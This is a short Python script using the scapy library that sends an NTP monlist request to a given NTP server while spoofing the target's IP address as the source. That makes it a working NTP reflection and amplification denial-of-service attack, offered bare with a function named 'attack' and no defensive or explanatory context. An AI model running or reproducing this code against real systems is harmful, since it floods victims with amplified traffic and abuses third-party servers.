#!/usr/bin/env python
 
import sys
from scapy.all import *
 
def attack(target, ntp_server):
  # try to build raw NTP package to minimize file size
  srp(Ether(dst="08:00:27:9C:BA:1C")/IP(dst=ntp_server, src=target, ttl=64, flags=2)/UDP(sport=41919, dport=123)/('\x17\x00\x03\x2a' + '\x00'*4))
 
if __name__ == "__main__":
  if len(sys.argv) != 3:
    sys.exit(1)
 
  target = sys.argv[1]
  ntp_server = sys.argv[2]
  attack(target, ntp_server)
